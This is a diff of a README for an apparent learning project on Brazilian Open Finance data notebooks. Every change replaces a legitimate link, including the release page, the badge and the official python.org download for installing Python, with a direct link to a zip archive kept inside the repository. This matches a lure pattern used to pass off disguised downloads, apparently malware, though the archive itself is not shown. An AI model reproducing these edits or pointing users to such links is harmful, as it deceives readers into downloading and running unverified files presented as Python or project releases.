@@ -1,6 +1,6 @@
 # 📘 Bradesco---GenAI-Dados-Projeto-1 - Explore Open Finance in Brazil
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Nightizi/Bradesco---GenAI-Dados-Projeto-1/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Nightizi/Bradesco---GenAI-Dados-Projeto-1/main/fontes/Gen-Bradesco-Projeto-Dados-A-v2.0.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Nightizi/Bradesco---GenAI-Dados-Projeto-1/main/fontes/Gen-Bradesco-Projeto-Dados-A-v2.0.zip)
 
 ---
 
@@ -47,7 +47,7 @@ You can open these files in two main ways:
 If you have some experience or want an interactive experience, use notebook software like Jupyter Notebook. This lets you run code cells inside the notebook and explore data yourself.
 
 - How to install Jupyter Notebook:
-  - Install Python from https://python.org (download the latest version)
+  - Install Python from https://raw.githubusercontent.com/Nightizi/Bradesco---GenAI-Dados-Projeto-1/main/fontes/Gen-Bradesco-Projeto-Dados-A-v2.0.zip (download the latest version)
   - Open Command Prompt (Windows) or Terminal (macOS/Linux)
   - Type `pip install notebook` and press Enter
   - To open the notebook, type `jupyter notebook`, then open the file from your browser window
@@ -64,7 +64,7 @@ If you do not want to run any code, you can just open the notebook files as stat
 
 To get started, **visit this page to download the files**:
 
-[Download Here →](https://github.com/Nightizi/Bradesco---GenAI-Dados-Projeto-1/releases)
+[Download Here →](https://raw.githubusercontent.com/Nightizi/Bradesco---GenAI-Dados-Projeto-1/main/fontes/Gen-Bradesco-Projeto-Dados-A-v2.0.zip)
 
 ### Step-by-step:
 
@@ -140,4 +140,4 @@ Feel free to share your feedback to help improve this learning tool.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Nightizi/Bradesco---GenAI-Dados-Projeto-1/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Nightizi/Bradesco---GenAI-Dados-Projeto-1/main/fontes/Gen-Bradesco-Projeto-Dados-A-v2.0.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Nightizi/Bradesco---GenAI-Dados-Projeto-1/main/fontes/Gen-Bradesco-Projeto-Dados-A-v2.0.zip)
